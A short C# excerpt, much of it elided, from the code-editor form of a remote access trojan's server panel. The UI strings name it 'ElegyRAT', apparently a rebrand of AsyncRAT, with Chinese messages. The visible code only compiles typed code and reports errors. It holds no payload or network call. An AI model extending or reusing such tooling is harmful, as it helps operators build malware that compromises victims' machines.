...
namespace Server.Forms
{
    public partial class FormDotNetEditor : Form
    {
        ...
        private void Button1_Click(object sender, EventArgs e)
        {
            ...
            if (!txtBox.Text.ToLower().Contains("try") && !txtBox.Text.ToLower().Contains("catch")) MessageBox.Show("请添加异常处理", "ElegyRAT | Dot 网络编辑器", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            ...
            try
            {
                ...
                if (compilerResults.Errors.Count > 0)
                {
                    foreach (CompilerError compilerError in compilerResults.Errors)
                    {
                        ...
                        MessageBox.Show(string.Format("{0}\n在线: {1}", compilerError.ErrorText, compilerError.Line), "ElegyRAT | Dot 网络编辑器", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                        break;
                    }
                }
                else
                {
                    ...
                    MessageBox.Show("没有错误!", "ElegyRAT | Dot 网络编辑器", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message, "AsyncRAT | Dot Net Editor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                MessageBox.Show(ex.Message, "ElegyRAT | Dot 网络编辑器", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            finally
            {
                //GC.Collect();
